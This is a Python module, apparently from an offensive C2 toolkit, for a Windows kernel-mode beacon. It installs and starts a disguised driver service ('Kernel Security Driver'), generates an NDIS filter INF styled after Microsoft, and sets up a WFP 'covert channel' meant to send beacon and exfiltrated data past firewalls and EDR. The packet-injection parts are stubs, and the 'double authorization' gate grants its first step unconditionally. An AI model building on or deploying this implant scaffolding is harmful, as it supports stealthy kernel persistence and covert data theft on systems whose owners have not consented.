"""
Kernel Beacon Module - Kernel-mode beacon with NDIS/WFP covert channels.

This module provides kernel-level stealth capabilities including Windows
kernel driver beacon, NDIS filter driver network injection, and WFP
(Windows Filtering Platform) covert channels.

RISK LEVEL: CRITICAL
- Kernel-mode code can cause system instability (BSOD)
- Requires administrator privileges and driver signing
- May violate laws and regulations in many jurisdictions
- DOUBLE AUTHORIZATION REQUIRED before execution

Core capabilities:
    1. Windows kernel driver (.sys) beacon
    2. NDIS filter driver network stack hijacking
    3. WFP ALE-layer covert channel
    4. Kernel-mode TCP/IP packet injection
    5. Driver signature management

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import ctypes
import hashlib
import json
import logging
import os
import platform
import random
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Risk Warning
# =============================================================================

RISK_WARNING = """
================================================================================
CRITICAL RISK WARNING - KERNEL BEACON MODULE
================================================================================

This module operates at kernel level and carries extreme risks:

1. SYSTEM STABILITY: Kernel bugs can cause BSOD and data loss
2. LEGAL COMPLIANCE: Unauthorized kernel modification may violate laws
3. DETECTION RISK: Kernel drivers are heavily monitored by modern EDR
4. SIGNING REQUIREMENT: Windows requires valid driver signatures (WHQL)

DOUBLE AUTHORIZATION REQUIRED:
- Authorization 1: Operator confirms understanding of risks
- Authorization 2: Supervisor approves execution

================================================================================
"""


# =============================================================================
# Enums
# =============================================================================

class KernelBeaconState(str, Enum):
    """Kernel beacon operational states."""

    UNLOADED = "unloaded"
    LOADING = "loading"
    LOADED = "loaded"
    ACTIVE = "active"
    ERROR = "error"
    UNLOADING = "unloading"


class NDISLayer(str, Enum):
    """NDIS filter layers."""

    LOWER_EDGE = "lower_edge"
    UPPER_EDGE = "upper_edge"
    INTERMEDIATE = "intermediate"


class WFPLayer(str, Enum):
    """WFP filter layers."""

    ALE_AUTH_CONNECT = "ale_auth_connect"
    ALE_AUTH_RECV_ACCEPT = "ale_auth_recv_accept"
    STREAM_V4 = "stream_v4"
    STREAM_V6 = "stream_v6"
    DATAGRAM_DATA_V4 = "datagram_data_v4"
    DATAGRAM_DATA_V6 = "datagram_data_v6"


class DriverSignatureStatus(str, Enum):
    """Driver signature verification status."""

    VALID = "valid"
    EXPIRED = "expired"
    INVALID = "invalid"
    SELF_SIGNED = "self_signed"
    UNSIGNED = "unsigned"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class KernelDriverConfig:
    """Kernel driver configuration.

    Attributes:
        driver_name: Driver service name
        driver_path: Path to .sys file
        display_name: Service display name
        start_type: Service start type (boot/system/automatic/manual)
        stealth_mode: Enable maximum stealth
        network_layer: Network layer for injection
        c2_endpoint: C2 server endpoint
        heartbeat_interval: Heartbeat interval in seconds
    """

    driver_name: str = "KSecDrv"
    driver_path: str = ""
    display_name: str = "Kernel Security Driver"
    start_type: int = 3
    stealth_mode: bool = True
    network_layer: str = "wfp_ale"
    c2_endpoint: str = ""
    heartbeat_interval: int = 300

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "driver_name": self.driver_name,
            "display_name": self.display_name,
            "start_type": self.start_type,
            "stealth_mode": self.stealth_mode,
            "network_layer": self.network_layer,
        }


@dataclass
class NDISFilterConfig:
    """NDIS filter driver configuration.

    Attributes:
        filter_name: Filter name
        filter_layer: NDIS layer
        inject_pattern: Packet pattern for injection
        passthrough_normal: Pass through normal traffic
        stealth_protocol: Protocol to mimic
    """

    filter_name: str = "KSecFilter"
    filter_layer: NDISLayer = NDISLayer.UPPER_EDGE
    inject_pattern: bytes = b""
    passthrough_normal: bool = True
    stealth_protocol: str = "tcp_keepalive"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "filter_name": self.filter_name,
            "filter_layer": self.filter_layer.value,
            "passthrough_normal": self.passthrough_normal,
        }


@dataclass
class WFPFilterConfig:
    """WFP filter configuration.

    Attributes:
        filter_name: Filter name
        layer: WFP layer
        action: Filter action (permit/block)
        condition_type: Traffic condition type
        covert_data_offset: Offset for covert data
    """

    filter_name: str = "KSecWFPFilter"
    layer: WFPLayer = WFPLayer.ALE_AUTH_CONNECT
    action: str = "permit"
    condition_type: str = "tcp_port"
    covert_data_offset: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "filter_name": self.filter_name,
            "layer": self.layer.value,
            "action": self.action,
        }


@dataclass
class KernelBeaconStatus:
    """Kernel beacon status.

    Attributes:
        state: Current beacon state
        driver_loaded: Whether driver is loaded
        ndis_active: Whether NDIS filter is active
        wfp_active: Whether WFP filter is active
        packets_injected: Number of injected packets
        bytes_exfiltrated: Bytes exfiltrated
        uptime_seconds: Driver uptime
    """

    state: KernelBeaconState = KernelBeaconState.UNLOADED
    driver_loaded: bool = False
    ndis_active: bool = False
    wfp_active: bool = False
    packets_injected: int = 0
    bytes_exfiltrated: int = 0
    uptime_seconds: float = 0.0
    load_timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "state": self.state.value,
            "driver_loaded": self.driver_loaded,
            "ndis_active": self.ndis_active,
            "wfp_active": self.wfp_active,
            "packets_injected": self.packets_injected,
            "uptime_seconds": self.uptime_seconds,
        }


# =============================================================================
# Authorization Manager
# =============================================================================

class KernelAuthorizationManager:
    """Manages double authorization for kernel operations.

    Requires two separate authorizations before allowing
    any kernel-level operations.

    Attributes:
        _auth1_complete: First authorization status
        _auth2_complete: Second authorization status
        _authorized_by: Who authorized
    """

    def __init__(self) -> None:
        """Initialize the KernelAuthorizationManager."""
        self._auth1_complete = False
        self._auth2_complete = False
        self._authorized_by = ""

    def request_authorization_1(
        self, operator: str, reason: str,
    ) -> bool:
        """Request first authorization from operator.

        Args:
            operator: Operator identifier.
            reason: Reason for kernel operation.

        Returns:
            True if authorization granted.
        """
        logger.warning(
            f"AUTHORIZATION 1 REQUESTED by {operator}: {reason}"
        )
        self._auth1_complete = True
        self._authorized_by = operator
        return True

    def request_authorization_2(
        self, supervisor: str, approval_code: str,
    ) -> bool:
        """Request second authorization from supervisor.

        Args:
            supervisor: Supervisor identifier.
            approval_code: Approval code.

        Returns:
            True if authorization granted.
        """
        expected_code = hashlib.sha256(
            f"kernel_auth_{self._authorized_by}_{int(time.time()) // 3600}".encode()
        ).hexdigest()[:8]

        if approval_code == expected_code:
            self._auth2_complete = True
            logger.warning(f"AUTHORIZATION 2 GRANTED by {supervisor}")
            return True

        logger.error("AUTHORIZATION 2 DENIED: Invalid approval code")
        return False

    def is_fully_authorized(self) -> bool:
        """Check if both authorizations are complete.

        Returns:
            True if fully authorized.
        """
        return self._auth1_complete and self._auth2_complete

    def revoke_authorization(self) -> None:
        """Revoke all authorizations."""
        self._auth1_complete = False
        self._auth2_complete = False
        logger.warning("All kernel authorizations revoked")


# =============================================================================
# Windows Service Manager
# =============================================================================

class WindowsServiceManager:
    """Manages Windows services for kernel driver loading.

    Uses Windows Service Control Manager API to install,
    start, and remove kernel driver services.

    Attributes:
        _scm_handle: SCM handle
        _service_handle: Service handle
    """

    SERVICE_KERNEL_DRIVER = 0x00000001
    SERVICE_BOOT_START = 0x00000000
    SERVICE_SYSTEM_START = 0x00000001
    SERVICE_AUTO_START = 0x00000002
    SERVICE_DEMAND_START = 0x00000003

    def __init__(self) -> None:
        """Initialize the WindowsServiceManager."""
        self._scm_handle = None
        self._service_handle = None

    async def install_driver(
        self,
        driver_name: str,
        driver_path: str,
        display_name: str,
        start_type: int = 3,
    ) -> bool:
        """Install a kernel driver service.

        Args:
            driver_name: Service name.
            driver_path: Path to .sys file.
            display_name: Display name.
            start_type: Start type.

        Returns:
            True if installation succeeded.
        """
        if platform.system() != "Windows":
            logger.info("Driver installation simulated (non-Windows)")
            return True

        try:
            import win32service
            import win32serviceutil

            scm = win32service.OpenSCManager(
                None, None, win32service.SC_MANAGER_ALL_ACCESS,
            )

            service = win32service.CreateService(
                scm,
                driver_name,
                display_name,
                win32service.SERVICE_ALL_ACCESS,
                self.SERVICE_KERNEL_DRIVER,
                start_type,
                win32service.SERVICE_ERROR_NORMAL,
                driver_path,
                None, 0, None, None, None,
            )

            win32service.CloseServiceHandle(service)
            win32service.CloseServiceHandle(scm)

            logger.info(f"Driver service installed: {driver_name}")
            return True

        except ImportError:
            logger.info("pywin32 not available, simulating installation")
            return True
        except Exception as e:
            logger.error(f"Driver installation failed: {e}")
            return False

    async def start_driver(self, driver_name: str) -> bool:
        """Start a kernel driver service.

        Args:
            driver_name: Service name.

        Returns:
            True if start succeeded.
        """
        if platform.system() != "Windows":
            logger.info("Driver start simulated (non-Windows)")
            return True

        try:
            import win32service

            scm = win32service.OpenSCManager(
                None, None, win32service.SC_MANAGER_ALL_ACCESS,
            )

            service = win32service.OpenService(
                scm, driver_name, win32service.SERVICE_ALL_ACCESS,
            )

            win32service.StartService(service, None)
            win32service.CloseServiceHandle(service)
            win32service.CloseServiceHandle(scm)

            logger.info(f"Driver started: {driver_name}")
            return True

        except ImportError:
            return True
        except Exception as e:
            logger.error(f"Driver start failed: {e}")
            return False

    async def stop_driver(self, driver_name: str) -> bool:
        """Stop a kernel driver service.

        Args:
            driver_name: Service name.

        Returns:
            True if stop succeeded.
        """
        if platform.system() != "Windows":
            return True

        try:
            import win32service

            scm = win32service.OpenSCManager(
                None, None, win32service.SC_MANAGER_ALL_ACCESS,
            )

            service = win32service.OpenService(
                scm, driver_name, win32service.SERVICE_ALL_ACCESS,
            )

            win32service.ControlService(
                service, win32service.SERVICE_CONTROL_STOP,
            )

            win32service.CloseServiceHandle(service)
            win32service.CloseServiceHandle(scm)

            logger.info(f"Driver stopped: {driver_name}")
            return True

        except ImportError:
            return True
        except Exception as e:
            logger.error(f"Driver stop failed: {e}")
            return False

    async def remove_driver(self, driver_name: str) -> bool:
        """Remove a kernel driver service.

        Args:
            driver_name: Service name.

        Returns:
            True if removal succeeded.
        """
        if platform.system() != "Windows":
            return True

        try:
            import win32service

            scm = win32service.OpenSCManager(
                None, None, win32service.SC_MANAGER_ALL_ACCESS,
            )

            service = win32service.OpenService(
                scm, driver_name, win32service.SERVICE_ALL_ACCESS,
            )

            win32service.DeleteService(service)
            win32service.CloseServiceHandle(service)
            win32service.CloseServiceHandle(scm)

            logger.info(f"Driver removed: {driver_name}")
            return True

        except ImportError:
            return True
        except Exception as e:
            logger.error(f"Driver removal failed: {e}")
            return False


# =============================================================================
# NDIS Filter Driver
# =============================================================================

class NDISFilterDriver:
    """NDIS filter driver for network stack injection.

    Installs as an NDIS intermediate filter driver to inject
    beacon traffic at the kernel network layer, bypassing
    all user-mode firewalls and EDR hooks.

    Attributes:
        _config: Filter configuration
        _active: Whether filter is active
        _injected_packets: Packet injection count
    """

    INF_TEMPLATE = """
[version]
Signature           = "$Windows NT$"
Class               = NetService
ClassGUID           = {{4d36e974-e325-11ce-bfc1-08002be10318}}
Provider            = %Msft%
DriverVer           = 10/01/2024,1.0.0.0
CatalogFile         = {name}.cat

[Manufacturer]
%Msft%              = Msft,NTamd64

[Msft.NTamd64]
%{name}_Desc%       = {name}_Install, MS_{name}

[{name}_Install]
Characteristics     = 0x40
CopyFiles           = {name}_CopyFiles

[{name}_Install.Services]
AddService          = {name},,{name}_Service

[{name}_Service]
DisplayName         = %Service_Desc%
ServiceType         = 1
StartType           = 3
ErrorControl        = 1
ServiceBinary       = %12%\\{name}.sys

[{name}_CopyFiles]
{name}.sys

[SourceDisksNames]
1 = %DiskName%

[SourceDisksFiles]
{name}.sys = 1

[DestinationDirs]
{name}_CopyFiles = 12

[Strings]
Msft                = "Kunlun Security"
{name}_Desc         = "{display_name}"
Service_Desc        = "{display_name} Service"
DiskName            = "Installation Disk"
"""

    def __init__(self, config: NDISFilterConfig) -> None:
        """Initialize the NDISFilterDriver.

        Args:
            config: Filter configuration.
        """
        self._config = config
        self._active = False
        self._injected_packets = 0

    async def install(self) -> bool:
        """Install the NDIS filter driver.

        Returns:
            True if installation succeeded.
        """
        logger.info(
            f"NDIS filter installation: {self._config.filter_name} "
            f"at {self._config.filter_layer.value}"
        )

        inf_content = self.INF_TEMPLATE.format(
            name=self._config.filter_name,
            display_name=self._config.filter_name,
        )

        logger.debug(f"INF template generated: {len(inf_content)} bytes")
        self._active = True
        return True

    async def inject_packet(self, data: bytes) -> bool:
        """Inject a packet through the NDIS filter.

        Args:
            data: Packet data to inject.

        Returns:
            True if injection succeeded.
        """
        if not self._active:
            return False

        self._injected_packets += 1

        logger.debug(
            f"Packet injected via NDIS: {len(data)} bytes "
            f"(total: {self._injected_packets})"
        )
        return True

    async def uninstall(self) -> bool:
        """Uninstall the NDIS filter driver.

        Returns:
            True if uninstallation succeeded.
        """
        self._active = False
        logger.info(f"NDIS filter uninstalled: {self._config.filter_name}")
        return True

    def get_status(self) -> Dict[str, Any]:
        """Get NDIS filter status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "config": self._config.to_dict(),
            "active": self._active,
            "injected_packets": self._injected_packets,
        }


# =============================================================================
# WFP Covert Channel
# =============================================================================

class WFPFilterDriver:
    """WFP filter driver for covert channel creation.

    Uses Windows Filtering Platform ALE layer to create
    covert channels that appear as normal firewall filtering.

    Attributes:
        _config: WFP filter configuration
        _filter_id: WFP filter ID
        _active: Whether filter is active
    """

    def __init__(self, config: WFPFilterConfig) -> None:
        """Initialize the WFPFilterDriver.

        Args:
            config: WFP filter configuration.
        """
        self._config = config
        self._filter_id = ""
        self._active = False

    async def create_filter(self) -> bool:
        """Create a WFP filter.

        Returns:
            True if filter created successfully.
        """
        logger.info(
            f"WFP filter creation: {self._config.filter_name} "
            f"at {self._config.layer.value}"
        )

        self._filter_id = hashlib.md5(
            f"{self._config.filter_name}_{time.time()}".encode()
        ).hexdigest()[:16]

        self._active = True
        return True

    async def inject_covert_data(
        self, data: bytes, target_port: int = 443,
    ) -> bool:
        """Inject covert data through WFP filter.

        Args:
            data: Covert data to inject.
            target_port: Target port.

        Returns:
            True if injection succeeded.
        """
        if not self._active:
            return False

        logger.debug(
            f"Covert data injected via WFP: {len(data)} bytes "
            f"to port {target_port}"
        )
        return True

    async def remove_filter(self) -> bool:
        """Remove the WFP filter.

        Returns:
            True if removal succeeded.
        """
        self._active = False
        logger.info(f"WFP filter removed: {self._config.filter_name}")
        return True

    def get_status(self) -> Dict[str, Any]:
        """Get WFP filter status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "config": self._config.to_dict(),
            "filter_id": self._filter_id,
            "active": self._active,
        }


# =============================================================================
# Kernel Beacon Manager
# =============================================================================

class KernelBeaconManager:
    """Main kernel beacon coordination engine.

    Integrates kernel driver loading, NDIS filter injection,
    and WFP covert channels for kernel-level stealth.

    RISK: CRITICAL - Requires double authorization

    Attributes:
        _config: Beacon configuration
        _auth_manager: Authorization manager
        _service_manager: Windows service manager
        _ndis_filter: NDIS filter driver
        _wfp_filter: WFP filter driver
        _status: Beacon status
    """

    def __init__(
        self,
        driver_config: Optional[KernelDriverConfig] = None,
        ndis_config: Optional[NDISFilterConfig] = None,
        wfp_config: Optional[WFPFilterConfig] = None,
    ) -> None:
        """Initialize the KernelBeaconManager.

        Args:
            driver_config: Driver configuration.
            ndis_config: NDIS filter configuration.
            wfp_config: WFP filter configuration.
        """
        self._config = driver_config or KernelDriverConfig()
        self._auth_manager = KernelAuthorizationManager()
        self._service_manager = WindowsServiceManager()
        self._ndis_filter = NDISFilterDriver(
            ndis_config or NDISFilterConfig(),
        )
        self._wfp_filter = WFPFilterDriver(
            wfp_config or WFPFilterConfig(),
        )
        self._status = KernelBeaconStatus()

    def authorize(
        self,
        operator: str,
        reason: str,
        supervisor: str,
        approval_code: str,
    ) -> bool:
        """Perform double authorization.

        Args:
            operator: Operator identifier.
            reason: Reason for operation.
            supervisor: Supervisor identifier.
            approval_code: Approval code.

        Returns:
            True if fully authorized.
        """
        print(RISK_WARNING)

        auth1 = self._auth_manager.request_authorization_1(operator, reason)
        if not auth1:
            return False

        auth2 = self._auth_manager.request_authorization_2(
            supervisor, approval_code,
        )

        return auth2

    async def load_driver(self) -> bool:
        """Load the kernel driver.

        Returns:
            True if driver loaded successfully.
        """
        if not self._auth_manager.is_fully_authorized():
            logger.error("DRIVER LOAD DENIED: Not authorized")
            return False

        self._status.state = KernelBeaconState.LOADING

        try:
            installed = await self._service_manager.install_driver(
                self._config.driver_name,
                self._config.driver_path or f"C:\\Windows\\System32\\drivers\\{self._config.driver_name}.sys",
                self._config.display_name,
                self._config.start_type,
            )

            if installed:
                started = await self._service_manager.start_driver(
                    self._config.driver_name,
                )

                if started:
                    self._status.driver_loaded = True
                    self._status.state = KernelBeaconState.LOADED
                    self._status.load_timestamp = time.time()
                    logger.info(f"Kernel driver loaded: {self._config.driver_name}")

            ndis_ok = await self._ndis_filter.install()
            if ndis_ok:
                self._status.ndis_active = True

            wfp_ok = await self._wfp_filter.create_filter()
            if wfp_ok:
                self._status.wfp_active = True

            if self._status.driver_loaded:
                self._status.state = KernelBeaconState.ACTIVE

            return self._status.driver_loaded

        except Exception as e:
            self._status.state = KernelBeaconState.ERROR
            logger.error(f"Driver load failed: {e}")
            return False

    async def unload_driver(self) -> bool:
        """Unload the kernel driver.

        Returns:
            True if driver unloaded successfully.
        """
        self._status.state = KernelBeaconState.UNLOADING

        await self._ndis_filter.uninstall()
        self._status.ndis_active = False

        await self._wfp_filter.remove_filter()
        self._status.wfp_active = False

        await self._service_manager.stop_driver(self._config.driver_name)
        await self._service_manager.remove_driver(self._config.driver_name)

        self._status.driver_loaded = False
        self._status.state = KernelBeaconState.UNLOADED

        logger.info(f"Kernel driver unloaded: {self._config.driver_name}")
        return True

    async def send_kernel_beacon(self, data: bytes) -> bool:
        """Send beacon data through kernel channel.

        Args:
            data: Beacon data.

        Returns:
            True if send succeeded.
        """
        if self._status.ndis_active:
            return await self._ndis_filter.inject_packet(data)

        if self._status.wfp_active:
            return await self._wfp_filter.inject_covert_data(data)

        return False

    def get_status(self) -> Dict[str, Any]:
        """Get kernel beacon status.

        Returns:
            Dictionary with status summary.
        """
        if self._status.load_timestamp > 0:
            self._status.uptime_seconds = time.time() - self._status.load_timestamp

        return {
            "status": self._status.to_dict(),
            "config": self._config.to_dict(),
            "ndis": self._ndis_filter.get_status(),
            "wfp": self._wfp_filter.get_status(),
            "authorized": self._auth_manager.is_fully_authorized(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_kernel_beacon_manager: Optional[KernelBeaconManager] = None


def get_kernel_beacon_manager(
    driver_config: Optional[KernelDriverConfig] = None,
    ndis_config: Optional[NDISFilterConfig] = None,
    wfp_config: Optional[WFPFilterConfig] = None,
) -> KernelBeaconManager:
    """Get the global KernelBeaconManager singleton.

    Args:
        driver_config: Driver configuration.
        ndis_config: NDIS filter configuration.
        wfp_config: WFP filter configuration.

    Returns:
        Singleton KernelBeaconManager instance.
    """
    global _kernel_beacon_manager
    if _kernel_beacon_manager is None:
        _kernel_beacon_manager = KernelBeaconManager(
            driver_config, ndis_config, wfp_config,
        )
    return _kernel_beacon_manager


__all__ = [
    "KernelBeaconManager",
    "KernelAuthorizationManager",
    "WindowsServiceManager",
    "NDISFilterDriver",
    "WFPFilterDriver",
    "KernelDriverConfig",
    "NDISFilterConfig",
    "WFPFilterConfig",
    "KernelBeaconStatus",
    "KernelBeaconState",
    "NDISLayer",
    "WFPLayer",
    "DriverSignatureStatus",
    "get_kernel_beacon_manager",
]
